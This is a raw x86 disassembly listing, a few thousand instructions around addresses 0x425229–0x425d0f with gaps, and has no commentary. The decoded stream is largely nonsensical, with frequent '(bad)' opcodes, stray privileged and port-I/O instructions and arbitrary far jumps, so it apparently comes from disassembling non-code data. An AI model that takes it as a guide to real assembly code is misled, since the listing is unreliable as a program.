  425229:	mov    WORD PTR [esi+eiz*1+0x7346c7fd],ds
  425230:	add    ebx,ecx
  425232:	int    0x88
  425234:	(bad)  
  425235:	into   
  425236:	push   cs
  425237:	aaa    
  425238:	adc    ch,dl
  42523a:	clc    
  42523b:	hlt    
  42523c:	sub    bh,BYTE PTR [eax-0x49]
  42523f:	mov    ds:0x689ee68b,eax
  425244:	data16 sub ah,dh
  425247:	icebp  
  425248:	shl    BYTE PTR [ecx+0x41],cl
  42524b:	push   edx
  42524c:	adc    bl,bl
  42524e:	sbb    DWORD PTR [ebp+ebx*1-0x1e7488bb],0x53
  425256:	inc    edx
  425257:	popa   
  425258:	mov    ebp,0x12063d2c
  42525d:	push   ss
  42525e:	add    edx,DWORD PTR [ecx+0x60]
  425261:	add    al,0xc
  425263:	mov    esp,0x44904da9
  425268:	(bad)  
  425269:	cmc    
  42526a:	ror    DWORD PTR [edx],0x22
  42526d:	mov    ah,0x93
  42526f:	mov    ecx,0xbc8f77aa
  425274:	loope  0x4252f0
  425276:	lock fstp DWORD PTR [edx]
  425279:	mov    edi,0xca1f7ce2
  42527e:	add    al,0x67
  425280:	adc    al,0xe2
  425282:	fisttp WORD PTR [ebx]
  425284:	push   ebp
  425285:	(bad)  
  425286:	add    cl,ch
  425288:	les    ecx,FWORD PTR [edi+0x35]
  42528b:	dec    ecx
  42528c:	push   ebx
  42528d:	inc    edi
  42528e:	jmp    0x8a4d1704
  425293:	cld    
  425294:	mov    bh,0x26
  425296:	xchg   BYTE PTR [edx-0x645808a2],al
  42529c:	jg     0x425281
  42529e:	jmp    0x42528d
  4252a0:	inc    ebp
  4252a1:	mov    edx,edi
  4252a3:	cmp    DWORD PTR [edx],ebp
  4252a5:	sbb    eax,0xa1f320d7
  4252aa:	retf   0xe61e
  4252ad:	pop    ebp
  4252ae:	mov    ds:0xe643f8cd,al
  4252b3:	sahf   
  4252b4:	stos   BYTE PTR es:[edi],al
  4252b5:	js     0x425273
  4252b7:	mov    al,0x1
  4252b9:	xchg   ebp,eax
  4252ba:	mov    ebx,0x40a6f60
  4252bf:	in     al,dx
  4252c0:	push   ds
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	xacquire xchg DWORD PTR [ebp-0x73edc100],eax
  425346:	add    DWORD PTR [eax],eax
  425348:	cmc    
  425349:	add    BYTE PTR [eax],al
  42534b:	add    al,cl
  42534d:	shl    eax,cl
  42534f:	sub    BYTE PTR [edx-0x29f969c7],cl
  425355:	retf   
  425356:	xlat   BYTE PTR ds:[ebx]
  425357:	pop    esp
  425358:	cmp    edi,DWORD PTR [edi]
  42535a:	sbb    BYTE PTR [edx+ebp*8+0x44],dh
  42535e:	pop    eax
  42535f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425360:	and    edx,edi
  425362:	ss stc 
  425364:	mov    bh,0x7
  425366:	retf   0xd14f
  425369:	and    BYTE PTR [eax],cl
  42536b:	add    cl,bh
  42536d:	call   0xd974:0x3146d21b
  425374:	pop    ecx
  425375:	call   0x9a70:0xcf9125aa
  42537c:	jmp    0x4253cd
  42537e:	add    edi,0xf6b769b4
  425384:	mov    bh,0x59
  425386:	iret   
  425387:	adc    BYTE PTR [edx+0x42],dh
  42538a:	dec    ebx
  42538b:	sbb    bl,BYTE PTR [ecx]
  42538d:	imul   BYTE PTR [edx+0x4e574102]
  425393:	mov    esp,ecx
  425395:	mov    al,ds:0xc7e7f515
  42539a:	mov    bh,0x1b
  42539c:	mov    dl,0x1e
  42539e:	xor    DWORD PTR [ecx-0x2e2292b9],ebp
  4253a4:	fnstenv [esi]
  4253a6:	jle    0x4253d6
  4253a8:	sbb    DWORD PTR [edx-0x31],esi
  4253ab:	aam    0xf8
  4253ad:	xor    eax,0x267b0831
  4253b2:	test   eax,0xe2ae4c7b
  4253b7:	xor    al,0x86
  4253b9:	adc    al,0x41
  4253bb:	hlt    
  4253bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253bd:	hlt    
  4253be:	xor    DWORD PTR [ecx+0x49309ce8],ecx
  4253c4:	add    al,0xed
  4253c6:	leave  
  4253c7:	xor    al,0xbd
  4253c9:	in     eax,0x96
  4253cb:	mov    ds:0x22743432,al
  4253d0:	mov    al,ds:0x7563f73f
  4253d5:	call   0x1d9e:0x131ceb63
  4253dc:	sahf   
  4253dd:	add    al,0xf7
  4253df:	test   esi,ebp
  4253e1:	outs   dx,BYTE PTR ds:[esi]
  4253e2:	pop    ebp
  4253e3:	popf   
  4253e4:	sub    eax,0xe5579e94
  4253e9:	lahf   
  4253ea:	addr16 test ecx,ebx
  4253ed:	cmp    bh,BYTE PTR [edx-0x1f]
  4253f0:	imul   esp,DWORD PTR [eax-0x3f],0x7f09f3be
  4253f7:	and    eax,ecx
  4253f9:	add    ch,BYTE PTR [esi+0x51]
  4253fc:	cmp    dh,dl
  4253fe:	retf   0xba64
  425401:	sub    bl,ch
  425403:	pushf  
  425404:	fdivr  DWORD PTR [ecx-0x23]
  425407:	xor    DWORD PTR [esi],eax
  425409:	add    eax,0x16084912
  42540e:	pop    ds
  42540f:	call   0xa531:0x5b634297
  425416:	pop    eax
  425417:	sbb    ch,BYTE PTR [ebx]
  425419:	imul   eax,edi,0xffffffd8
  42541c:	imul   ebx,DWORD PTR [ebp+edi*1-0x6],0xc
  425421:	xchg   esp,eax
  425422:	and    al,0x95
  425424:	arpl   WORD PTR [esi-0x63cce86d],bp
  42542a:	cmp    DWORD PTR [ecx],eax
  42542c:	int    0x7f
  42542e:	xchg   edx,eax
  42542f:	mov    WORD PTR [ecx+0x2a],es
  425432:	std    
  425433:	mov    ds:0xfbb9a061,al
  425438:	inc    ebx
  425439:	bound  edi,QWORD PTR [ecx]
  42543b:	fsubr  QWORD PTR [ebp-0x2]
  42543e:	cmc    
  42543f:	sahf   
  425440:	add    eax,0x0
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	pop    ecx
  4254c1:	dec    esi
  4254c2:	ret    0x791
  4254c5:	lea    eax,[ecx]
  4254c7:	add    ch,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    cl,cl
  4254cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254ce:	adc    esi,ebx
  4254d0:	fbstp  TBYTE PTR [esi+0x26]
  4254d3:	bound  ebx,QWORD PTR [edx+0xa2a4795]
  4254d9:	in     al,0x39
  4254db:	cmp    WORD PTR [eax-0x7a],si
  4254df:	in     eax,dx
  4254e0:	std    
  4254e1:	fbstp  TBYTE PTR [ebx+0x19]
  4254e4:	pop    edx
  4254e5:	jb     0x425536
  4254e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254e8:	inc    edx
  4254e9:	call   0x301f:0xb3fd1ffe
  4254f0:	loop   0x4254ad
  4254f2:	ror    ah,0x29
  4254f5:	push   0x27fc451b
  4254fa:	cwde   
  4254fb:	sub    esi,ecx
  4254fd:	fs pop ss
  4254ff:	(bad)  
  425500:	das    
  425501:	add    DWORD PTR [esi],ecx
  425503:	scas   al,BYTE PTR es:[edi]
  425504:	les    eax,FWORD PTR [esi-0x55351f90]
  42550a:	add    dh,ah
  42550c:	jno    0x425544
  42550e:	or     DWORD PTR cs:[edx+0x60],esp
  425512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425513:	dec    ecx
  425514:	add    BYTE PTR [ebp+0x17],dh
  425517:	jmp    0xe1dfa17c
  42551c:	dec    eax
  42551d:	in     eax,dx
  42551e:	pop    esi
  42551f:	mov    dl,0x1c
  425521:	aad    0x40
  425523:	jecxz  0x42555b
  425525:	push   0x6f
  425527:	lods   eax,DWORD PTR ds:[esi]
  425528:	int3   
  425529:	pop    es
  42552a:	add    eax,0xc11d3863
  42552f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425530:	xor    edx,DWORD PTR [ecx+0x6f]
  425533:	fsub   DWORD PTR [esi+0x2cf36c1f]
  425539:	jb     0x4255a9
  42553b:	and    DWORD PTR [edi],ebp
  42553d:	popa   
  42553e:	in     eax,dx
  42553f:	mov    edi,0x1cd8c6cc
  425544:	aas    
  425545:	shr    ch,cl
  425547:	mov    dl,ch
  425549:	jg     0x425562
  42554b:	sbb    eax,0xe879ba63
  425550:	jb     0x42558e
  425552:	dec    ebx
  425553:	and    DWORD PTR [edx],ebx
  425555:	js     0x425510
  425557:	(bad)  
  425558:	push   ss
  425559:	std    
  42555a:	and    BYTE PTR ds:0x1082bad2,0x33
  425561:	outs   dx,BYTE PTR ds:[esi]
  425562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425563:	or     DWORD PTR [eax-0x6564d8d9],esp
  425569:	and    eax,0xb12b9aaf
  42556e:	mov    WORD PTR [edi+0x3901abbb],es
  425574:	fsubr  QWORD PTR [ebx+0x50]
  425577:	(bad)  
  425579:	fbstp  TBYTE PTR [edi-0x7f]
  42557c:	sub    ch,BYTE PTR fs:[ecx+0x4882dc8b]
  425583:	xchg   esp,eax
  425584:	and    DWORD PTR [edi],edi
  425586:	mov    ds,ebx
  425588:	xchg   esp,eax
  425589:	popf   
  42558a:	aam    0x58
  42558c:	mov    edx,0x6733a78e
  425591:	mov    esi,0x2914df39
  425596:	fistp  DWORD PTR [ecx+0x7]
  425599:	jmp    0x4255cf
  42559b:	inc    esp
  42559c:	pop    eax
  42559d:	scas   eax,DWORD PTR es:[edi]
  42559e:	xchg   DWORD PTR [eax+0x6e692330],edi
  4255a4:	dec    esp
  4255a5:	jnp    0x425591
  4255a7:	je     0x42556e
  4255a9:	mov    ch,0xb0
  4255ab:	int3   
  4255ac:	sbb    ebp,ecx
  4255ae:	mov    ebx,0x4f4a88d1
  4255b3:	cmp    ebx,DWORD PTR [esi-0x6b0df85c]
  4255b9:	(bad)  [eax-0x45]
  4255bc:	lahf   
  4255bd:	aam    0x8
  4255bf:	enter  0x9a,0x0
	...
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	xor    BYTE PTR [ecx+0x37],dh
  425643:	cmp    esp,edi
  425645:	lea    eax,[ecx]
  425647:	add    ch,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [edx],ah
  42564d:	loope  0x42569d
  42564f:	and    bl,BYTE PTR [esi]
  425651:	fisubr DWORD PTR [ebp-0x2f90d268]
  425657:	adc    ah,BYTE PTR [ebp-0x1]
  42565a:	ja     0x4256d9
  42565c:	stos   BYTE PTR es:[edi],al
  42565d:	pushaw 
  42565f:	out    dx,eax
  425660:	mov    ah,0xf1
  425662:	sbb    eax,0x60ff5bd2
  425667:	idiv   DWORD PTR [eax]
  425669:	push   ebp
  42566a:	fstp   TBYTE PTR [edi+0x41]
  42566d:	int    0x40
  42566f:	pop    ecx
  425670:	jnp    0x42568c
  425672:	xchg   ebx,eax
  425673:	popf   
  425674:	xchg   ebx,eax
  425675:	push   0x67
  425677:	repnz (bad) 
  425679:	xchg   ecx,eax
  42567a:	or     eax,0xdcd7bc95
  42567f:	test   BYTE PTR [ebx-0x6e4dbafc],ah
  425685:	or     esp,DWORD PTR [edx+0x38069e2c]
  42568b:	mul    DWORD PTR [edx+0x152927e6]
  425691:	xlat   BYTE PTR ds:[ebx]
  425692:	and    BYTE PTR [ecx+ecx*8],cl
  425695:	push   eax
  425696:	adc    DWORD PTR [edx-0x6eda281c],eax
  42569c:	pop    edi
  42569d:	push   ebp
  42569e:	push   ebp
  42569f:	sbb    al,0x18
  4256a1:	add    BYTE PTR [edi],al
  4256a3:	mov    eax,ds:0xae1e0884
  4256a8:	cmc    
  4256a9:	cmp    eax,edi
  4256ab:	mov    esp,0xe47a8533
  4256b0:	mov    es,esi
  4256b2:	jns    0x425692
  4256b4:	lds    ecx,FWORD PTR [eax+ebx*2-0x12a66661]
  4256bb:	(bad)  
  4256bc:	sub    ch,BYTE PTR [edx+0x1ee23cc0]
  4256c2:	mov    dh,0xee
  4256c4:	lahf   
  4256c5:	stos   DWORD PTR es:[edi],eax
  4256c6:	cmp    DWORD PTR [esi+0xd],eax
  4256c9:	(bad)  
  4256cb:	xchg   ebx,eax
  4256cc:	push   DWORD PTR [edx]
  4256ce:	mov    esp,0xec41094c
  4256d3:	mov    WORD PTR [ecx+esi*8-0x3601d97b],gs
  4256da:	adc    eax,0xfdde7dda
  4256df:	sbb    cl,BYTE PTR [edx+0x571e12c5]
  4256e5:	test   al,0xa7
  4256e7:	and    esi,edi
  4256e9:	test   BYTE PTR [ebp+0x50ff255],0xac
  4256f0:	repnz mov ecx,esp
  4256f3:	fsub   QWORD PTR [edi-0x74e3f8c1]
  4256f9:	add    al,0x66
  4256fb:	adc    al,0x3e
  4256fd:	cmp    DWORD PTR [ebp-0x146a8750],0x39
  425704:	mov    eax,ds:0x6fa0f7e7
  425709:	(bad)  
  42570a:	iret   
  42570b:	test   BYTE PTR ds:0x3dce47e,bh
  425711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425712:	cli    
  425713:	add    BYTE PTR [edi-0x3186dee7],cl
  425719:	mov    esi,0x8cd37cbc
  42571e:	mov    dh,BYTE PTR [edx+0x19c31f3b]
  425724:	or     BYTE PTR [eax],0x7a
  425727:	push   edi
  425728:	stos   DWORD PTR es:[edi],eax
  425729:	add    BYTE PTR [eax],0x51
  42572c:	js     0x42574b
  42572e:	shl    dl,0xd2
  425731:	mov    bl,BYTE PTR [esp+edx*8-0x4a]
  425735:	out    0x6c,eax
  425737:	inc    ecx
  425738:	mov    ch,BYTE PTR [esi-0x2d3aea0a]
  42573e:	or     DWORD PTR [esi-0x52],esi
	...
  4257b1:	add    BYTE PTR [eax],al
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	outs   dx,BYTE PTR ds:[esi]
  4257c1:	push   0x8ef1dafc
  4257c6:	add    DWORD PTR [eax],eax
  4257c8:	cmc    
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [edi],bh
  4257cd:	addr16 into 
  4257cf:	cli    
  4257d0:	cmp    al,0xc1
  4257d2:	cmp    eax,0xeeec430f
  4257d7:	mov    dl,0xd1
  4257d9:	jne    0x4257ad
  4257db:	and    al,BYTE PTR [edx]
  4257dd:	ret    
  4257de:	(bad)  
  4257e0:	jnp    0x4257b9
  4257e2:	and    bh,BYTE PTR [esi+0x462befba]
  4257e8:	je     0x42580a
  4257ea:	adc    al,0xc
  4257ec:	mov    ds:0xfc4ed7df,al
  4257f1:	bound  ebx,QWORD PTR ds:0x2f87800d
  4257f7:	test   al,0x76
  4257f9:	jle    0x4257d2
  4257fb:	or     al,0xe7
  4257fd:	in     al,dx
  4257fe:	loope  0x425833
  425800:	dec    esp
  425801:	xchg   DWORD PTR [ebx],ebx
  425803:	xchg   bx,ax
  425805:	aaa    
  425806:	cli    
  425807:	and    BYTE PTR [edx],0x78
  42580a:	fdivr  st,st(0)
  42580c:	push   ecx
  42580d:	les    esi,FWORD PTR [ecx+0x21b5d3ed]
  425813:	sar    esp,cl
  425815:	jmp    0x4257e0
  425817:	cli    
  425818:	pop    esp
  425819:	add    ch,BYTE PTR [edx]
  42581b:	mov    edi,DWORD PTR [edi-0x45d79cc8]
  425821:	adc    esi,esi
  425823:	jl     0x42587b
  425825:	mov    edi,0x3a3408c7
  42582a:	call   0xa32f5a6c
  42582f:	icebp  
  425830:	fucomi st,st(6)
  425832:	pushf  
  425833:	fst    QWORD PTR [ebx]
  425835:	popa   
  425836:	stc    
  425837:	int    0x42
  425839:	aas    
  42583a:	or     dh,BYTE PTR [ebx-0xd]
  42583d:	push   esi
  42583e:	daa    
  42583f:	add    DWORD PTR [edx],ebp
  425841:	sub    bh,dh
  425843:	add    eax,0x625728d6
  425848:	cdq    
  425849:	push   ss
  42584a:	popa   
  42584b:	xchg   ebx,eax
  42584c:	outs   dx,BYTE PTR ds:[esi]
  42584d:	outs   dx,BYTE PTR ds:[esi]
  42584e:	enter  0x132c,0x6f
  425852:	push   ecx
  425853:	lods   eax,DWORD PTR ds:[esi]
  425854:	outs   dx,DWORD PTR ds:[esi]
  425855:	cmc    
  425856:	(bad)  
  425857:	sub    BYTE PTR gs:[eax],bl
  42585a:	fistp  QWORD PTR [ebx-0x1b19aa66]
  425860:	xchg   edx,eax
  425861:	das    
  425862:	xchg   esi,eax
  425863:	test   DWORD PTR [ecx+0x7f],esi
  425866:	inc    ecx
  425867:	sub    DWORD PTR [esi-0x767db3f4],ebp
  42586d:	inc    edi
  42586e:	sbb    edi,DWORD PTR [ecx]
  425870:	fwait
  425871:	xor    BYTE PTR [eax],ch
  425873:	das    
  425874:	sahf   
  425875:	jno    0x4258b1
  425877:	jns    0x42585b
  425879:	or     eax,0x4572e460
  42587e:	sub    ebp,ebx
  425880:	xor    BYTE PTR [edx*8-0x2aed6902],dh
  425887:	dec    edx
  425888:	sub    eax,0x71cb43
  42588d:	adc    DWORD PTR [ebx+0x3c699702],0xffffff95
  425894:	push   ebp
  425895:	rol    BYTE PTR [eax],1
  425897:	push   es
  425898:	add    eax,esp
  42589a:	sbb    ebp,DWORD PTR [ebx-0x3e]
  42589d:	imul   ebp,esi,0x1a
  4258a0:	push   esp
  4258a1:	test   BYTE PTR [esi-0x51],0x95
  4258a5:	push   ds
  4258a6:	(bad)  
  4258a7:	and    BYTE PTR [ecx],ah
  4258a9:	mov    dl,cl
  4258ab:	pop    ss
  4258ac:	pop    edx
  4258ad:	or     ebx,DWORD PTR [eax+0x7d]
  4258b0:	pop    ebp
  4258b1:	mov    ah,0x71
  4258b3:	xchg   esp,eax
  4258b4:	xchg   esi,eax
  4258b5:	sbb    WORD PTR [ebp-0x3b],sp
  4258b9:	jecxz  0x425894
  4258bb:	addr16 jb 0x425919
  4258be:	xchg   DWORD PTR [ebx],esp
  4258c0:	mov    eax,DWORD PTR [eax]
	...
  425932:	add    BYTE PTR [eax],al
  425934:	imul   ebx,DWORD PTR [eax],0x63
  425937:	push   0x73
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	shl    BYTE PTR [ebp+0x20],0x0
  425944:	out    0x8f,al
  425946:	add    DWORD PTR [eax],eax
  425948:	cmc    
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR ds:0x39f9db74,ch
  425951:	and    DWORD PTR [eax+0x17],edx
  425954:	fidivr WORD PTR [eax-0x58]
  425957:	and    ch,0x45
  42595a:	mov    dl,0x44
  42595c:	(bad)  
  42595d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42595e:	(bad)  
  42595f:	push   ecx
  425960:	adc    eax,edi
  425962:	retf   0xcc44
  425965:	add    DWORD PTR [ecx-0x6897de9f],0xda418529
  42596f:	outs   dx,BYTE PTR ds:[esi]
  425970:	mov    ch,0x20
  425972:	push   0x62
  425974:	pop    ebx
  425975:	sbb    BYTE PTR [ebx+0x77],ah
  425978:	aaa    
  425979:	cdq    
  42597a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42597b:	hlt    
  42597c:	jp     0x4259bc
  42597e:	or     al,0x22
  425980:	mov    bl,0xa0
  425982:	mov    cl,0x89
  425984:	cld    
  425985:	retf   0x4c3d
  425988:	cmp    edx,DWORD PTR es:[ebx+edx*8+0x69]
  42598d:	in     al,0xc0
  42598f:	dec    eax
  425990:	and    al,0xcf
  425992:	jno    0x425957
  425994:	cwde   
  425995:	jnp    0x42598f
  425997:	xor    esp,esp
  425999:	inc    edx
  42599a:	sub    esp,esi
  42599c:	jecxz  0x4259e8
  42599e:	xchg   DWORD PTR [edi-0x17],edx
  4259a1:	mov    ah,0x69
  4259a3:	pop    ecx
  4259a4:	scas   al,BYTE PTR es:[edi]
  4259a5:	fidivr DWORD PTR [edx-0x1c7f7a10]
  4259ab:	mov    ebx,0x74e6afe4
  4259b0:	sub    al,0x2c
  4259b2:	dec    edi
  4259b3:	outs   dx,DWORD PTR ds:[esi]
  4259b4:	(bad)  
  4259b5:	pop    ebx
  4259b6:	mov    edi,cs
  4259b8:	test   BYTE PTR [ecx],bl
  4259ba:	mov    DWORD PTR [edi+0x627772ce],ecx
  4259c0:	in     al,dx
  4259c1:	dec    edx
  4259c2:	mov    ebp,0x12347c54
  4259c7:	(bad)  
  4259c8:	push   ss
  4259c9:	lock and edx,DWORD PTR [ecx+ecx*4]
  4259cd:	mov    esp,0x585aadbe
  4259d2:	imul   esp,DWORD PTR [eax+0x21c8e6ce],0x63920218
  4259dc:	fldcw  WORD PTR [esi-0x619fa73e]
  4259e2:	push   ss
  4259e3:	dec    BYTE PTR [edx+ecx*2]
  4259e6:	xor    esi,ecx
  4259e8:	fnstcw WORD PTR ds:0xc257639a
  4259ee:	or     ecx,DWORD PTR [edx-0x79813db]
  4259f4:	or     BYTE PTR [ecx],bh
  4259f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f7:	mov    cl,0x45
  4259f9:	sub    DWORD PTR [edx+0x76],edx
  4259fc:	jmp    0x1b40:0xb1713560
  425a03:	jp     0x425a47
  425a05:	lock and edi,DWORD PTR [esi+0x51]
  425a09:	retf   
  425a0a:	mov    edx,0x784de7d9
  425a0f:	xor    eax,0xac876463
  425a14:	and    eax,0x4be4c0b4
  425a19:	getsec 
  425a1b:	lods   al,BYTE PTR ds:[esi]
  425a1c:	cld    
  425a1d:	dec    edx
  425a1e:	not    DWORD PTR [esi]
  425a20:	shr    BYTE PTR ds:0x5a59de4f,1
  425a26:	jp     0x425a52
  425a28:	inc    edi
  425a29:	ret    
  425a2a:	not    DWORD PTR ds:0x9908cedf
  425a30:	mov    al,0x64
  425a32:	inc    ecx
  425a33:	pusha  
  425a34:	retf   0x126
  425a37:	call   0x949fadf0
  425a3c:	(bad)  
  425a3d:	sub    BYTE PTR [ebp+0x8ea],al
	...
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	inc    edi
  425ac1:	jo     0x425a79
  425ac3:	mov    ch,0xdb
  425ac5:	nop
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	cmc    
  425ac9:	add    BYTE PTR [eax],al
  425acb:	add    BYTE PTR [ebx],al
  425acd:	jp     0x425ad4
  425acf:	retf   
  425ad0:	pop    esp
  425ad1:	sbb    eax,0x2950c308
  425ad6:	icebp  
  425ad7:	dec    edi
  425ad8:	pop    ss
  425ad9:	xchg   ecx,eax
  425ada:	sbb    DWORD PTR [eax+edi*4-0x792fdf01],esp
  425ae1:	sub    eax,0xf4d87030
  425ae6:	dec    edi
  425ae7:	pop    ebp
  425ae8:	inc    ecx
  425ae9:	pop    es
  425aea:	das    
  425aeb:	(bad)  
  425aec:	out    0xc3,al
  425aee:	push   edx
  425aef:	ss pop esp
  425af1:	out    dx,eax
  425af2:	pop    ecx
  425af3:	mov    ah,0xac
  425af5:	out    dx,al
  425af6:	add    al,cl
  425af8:	jmp    0xe0ec:0xb0b0e1ac
  425aff:	loop   0x425afd
  425b01:	mov    ds:0xf8a1d931,eax
  425b06:	cwde   
  425b07:	dec    ebp
  425b08:	adc    eax,0x117e14a9
  425b0d:	aad    0xa5
  425b0f:	in     al,dx
  425b10:	mov    ecx,0x5becb581
  425b15:	out    dx,al
  425b16:	test   al,0x1b
  425b18:	or     BYTE PTR [esi-0x3a],0xdb
  425b1c:	push   es
  425b1d:	cmp    BYTE PTR [edx],0x7e
  425b20:	cwde   
  425b21:	out    dx,eax
  425b22:	std    
  425b23:	shr    cl,cl
  425b25:	xor    ebp,ecx
  425b27:	sub    BYTE PTR [ecx-0x35],bl
  425b2a:	mov    ecx,0x4605aa1f
  425b2f:	adc    al,0x49
  425b31:	pop    es
  425b32:	push   ds
  425b33:	(bad)  
  425b34:	out    0xb0,eax
  425b36:	xor    al,0xc6
  425b38:	jne    0x425b9b
  425b3a:	cmc    
  425b3b:	adc    eax,0x6a0f050d
  425b40:	xor    DWORD PTR [edx+0x20],0xd7a0b2d6
  425b47:	jo     0x425b72
  425b49:	add    esi,DWORD PTR [esi]
  425b4b:	adc    eax,0x1a6089ba
  425b50:	ret    0x5780
  425b53:	push   edx
  425b54:	xchg   esi,eax
  425b55:	retf   
  425b56:	shr    DWORD PTR [eax],0xcb
  425b59:	mov    edi,0x6bab5eac
  425b5e:	test   DWORD PTR fs:[esi],ebx
  425b61:	or     eax,DWORD PTR [eax]
  425b63:	in     eax,0x5e
  425b65:	xor    eax,0x1d847586
  425b6a:	or     BYTE PTR [ebx],al
  425b6c:	dec    edi
  425b6d:	xor    eax,0xc0e71e6c
  425b72:	dec    eax
  425b73:	ds enter 0x587e,0x16
  425b78:	rcl    BYTE PTR [ebp+0xf],cl
  425b7b:	cmp    esi,edi
  425b7d:	mov    ah,0xd0
  425b7f:	xor    edi,DWORD PTR [ecx+0x6]
  425b82:	sbb    DWORD PTR [ebp+0xe],edi
  425b85:	cmp    dh,BYTE PTR [edx+0x70]
  425b88:	ins    BYTE PTR es:[edi],dx
  425b89:	add    eax,0x96e8faa2
  425b8e:	outs   dx,BYTE PTR ds:[esi]
  425b8f:	and    eax,0x6ce3f20b
  425b94:	into   
  425b95:	mov    eax,0x11de0da8
  425b9a:	sub    eax,DWORD PTR [eax+0x7c]
  425b9d:	sbb    DWORD PTR [esi],esi
  425b9f:	fidiv  WORD PTR [ebp+0x7195a211]
  425ba5:	mov    dl,0x2f
  425ba7:	sbb    al,0x4f
  425ba9:	call   0xe62d:0x30d5fd99
  425bb0:	xchg   BYTE PTR [edx+0x10],ch
  425bb3:	mov    esi,0x10a65581
  425bb8:	(bad)  
  425bb9:	std    
  425bba:	repnz ss or eax,0x8d32fd7f
	...
  425c31:	add    BYTE PTR [eax],al
  425c33:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  425c37:	push   0xffffffb6
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	(bad)  
  425c3b:	fdivp  st(2),st
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0x63cd78df
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    BYTE PTR [esi+0x19c2bbde],cl
  425c51:	sub    dh,BYTE PTR [edi+0x15383879]
  425c57:	push   esp
  425c58:	push   es
  425c59:	xchg   ecx,eax
  425c5a:	sbb    DWORD PTR [esp+ebx*2+0x7b],esp
  425c5e:	dec    eax
  425c5f:	scas   al,BYTE PTR es:[edi]
  425c60:	cwde   
  425c61:	iret   
  425c62:	mov    eax,0xec15e0f7
  425c67:	mov    cl,0x26
  425c69:	cmp    edx,esi
  425c6b:	add    BYTE PTR [eax-0x6b94031d],al
  425c71:	push   edx
  425c72:	pop    esi
  425c73:	mov    ch,0x60
  425c75:	sub    dh,BYTE PTR [edx-0x6b]
  425c78:	retf   
  425c79:	ret    0x8bda
  425c7c:	add    eax,0xc781d5e5
  425c81:	mov    ch,0xb8
  425c83:	and    dh,BYTE PTR ds:0x3b1e1a3e
  425c89:	jge    0x425cfe
  425c8b:	push   0x10a8dd77
  425c90:	in     eax,dx
  425c91:	fimul  DWORD PTR fs:[esi+eiz*8]
  425c95:	jmp    DWORD PTR [ebx+0xd]
  425c98:	and    esi,DWORD PTR [esp+edi*8-0x35cb6afb]
  425c9f:	es sub al,0xb1
  425ca2:	hlt    
  425ca3:	inc    eax
  425ca4:	sub    esp,esp
  425ca6:	or     esp,DWORD PTR [esp+esi*4]
  425ca9:	cmp    al,0x49
  425cab:	xchg   edx,eax
  425cac:	jge    0x425c7f
  425cae:	rcr    BYTE PTR [edx-0x1f80c4fd],cl
  425cb4:	mov    ebp,0x21bfb9de
  425cb9:	pop    edi
  425cba:	jge    0x425c5a
  425cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425cbd:	sbb    DWORD PTR [eax],0xffffff90
  425cc0:	add    eax,0x57326912
  425cc5:	aaa    
  425cc6:	add    DWORD PTR [edx+0x18],0x7d
  425cca:	push   es
  425ccb:	(bad)
  425cce:	rcr    BYTE PTR [ebx-0x78d83103],0x31
  425cd5:	retf   
  425cd6:	mov    al,0x2
  425cd8:	ret    0xc4b5
  425cdb:	push   cs
  425cdc:	jmp    0x664b:0x696c28d8
  425ce3:	jne    0x425c6b
  425ce5:	imul   edi,DWORD PTR [ecx],0xffffffae
  425ce8:	iret   
  425ce9:	enter  0x64b9,0x7c
  425ced:	dec    ecx
  425cee:	pop    edx
  425cef:	jae    0x425c9a
  425cf1:	retf   
  425cf2:	pop    ebp
  425cf3:	xchg   esi,eax
  425cf4:	cli    
  425cf5:	lea    esp,cs:[esi+edx*2+0x6f91a43c]
  425cfd:	cs dec ebp
  425cff:	push   0xc52fcce4
  425d04:	xchg   ecx,eax
  425d05:	fs lahf 
  425d07:	mov    WORD PTR [esi+0x5d5a009e],fs
  425d0d:	jbe    0x425cf4
  425d0f:	dec    ecx
